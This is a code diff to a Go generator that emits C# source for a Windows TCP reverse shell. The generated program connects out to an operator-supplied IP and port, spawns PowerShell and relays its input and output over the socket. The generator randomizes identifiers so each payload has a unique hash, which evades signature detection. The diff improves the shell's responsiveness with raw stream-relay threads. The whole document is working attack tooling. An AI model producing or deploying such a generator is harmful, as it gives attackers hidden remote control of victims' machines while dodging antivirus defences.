@@ -69,22 +69,25 @@ func csFieldName() string  { return plausibleName(csFieldPrefixes, csNameSuffixe
 
 // GenerateSource returns the C# source code for a TCP reverse shell.
 // All identifiers are randomized so each generation has a unique hash.
+// Uses raw stream reading (not OutputDataReceived) so that partial lines
+// like the PS prompt are sent immediately without waiting for a newline.
 func (g *CSharpShellGenerator) GenerateSource() string {
 	ns := csClassName()
 	cls := csClassName()
-	handleMethod := csMethodName()
-	writerField := csFieldName()
+	relayMethod := csMethodName()
+	netStream := csFieldName()
 
 	return fmt.Sprintf(`using System;
 using System.IO;
 using System.Net.Sockets;
 using System.Diagnostics;
+using System.Threading;
 
 namespace %s
 {
     internal class %s
     {
-        private static StreamWriter %s;
+        private static Stream %s;
 
         static void Main(string[] args)
         {
@@ -93,9 +96,8 @@ namespace %s
                 TcpClient client = new TcpClient();
                 client.Connect("%s", %d);
 
-                Stream stream = client.GetStream();
-                StreamReader streamReader = new StreamReader(stream);
-                %s = new StreamWriter(stream);
+                %s = client.GetStream();
+                StreamReader streamReader = new StreamReader(%s);
 
                 Process p = new Process();
                 p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
@@ -105,12 +107,13 @@ namespace %s
                 p.StartInfo.RedirectStandardOutput = true;
                 p.StartInfo.RedirectStandardError = true;
                 p.StartInfo.RedirectStandardInput = true;
-                p.OutputDataReceived += new DataReceivedEventHandler(%s);
-                p.ErrorDataReceived += new DataReceivedEventHandler(%s);
 
                 p.Start();
-                p.BeginOutputReadLine();
-                p.BeginErrorReadLine();
+
+                // Raw stream relay threads — forward bytes immediately,
+                // including partial lines (like the PS prompt).
+                new Thread(() => %s(p.StandardOutput.BaseStream)) { IsBackground = true }.Start();
+                new Thread(() => %s(p.StandardError.BaseStream)) { IsBackground = true }.Start();
 
                 string userInput = "";
                 while (!userInput.Equals("exit"))
@@ -125,22 +128,28 @@ namespace %s
             catch (Exception) { }
         }
 
-        private static void %s(object sender, DataReceivedEventArgs e)
+        private static void %s(Stream src)
         {
-            if (e.Data != null)
+            try
             {
-                %s.WriteLine(e.Data);
-                %s.Flush();
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = src.Read(buf, 0, buf.Length)) > 0)
+                {
+                    %s.Write(buf, 0, n);
+                    %s.Flush();
+                }
             }
+            catch { }
         }
     }
 }
-`, ns, cls, writerField,
+`, ns, cls, netStream,
 		g.IP, g.Port,
-		writerField,
-		handleMethod, handleMethod,
-		handleMethod,
-		writerField, writerField,
+		netStream, netStream,
+		relayMethod, relayMethod,
+		relayMethod,
+		netStream, netStream,
 	)
 }
 
